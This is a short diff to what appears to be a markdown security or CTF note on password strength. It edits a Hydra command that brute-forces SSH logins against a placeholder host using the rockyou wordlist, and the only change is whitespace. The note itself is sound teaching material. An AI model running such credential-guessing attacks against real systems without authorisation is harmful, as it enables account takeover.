@@ -15,6 +15,6 @@ This shows the importance of using a strong password, if your password is common
 ## SSH bruteforce attack
 
 ```commandline
-hydra -t 16 -l  <USER-NAME> -P /usr/share/wordlists/rockyou.txt -vV <IP> ssh
+hydra -t 16 -l <USER-NAME> -P /usr/share/wordlists/rockyou.txt -vV <IP> ssh
 ```
 
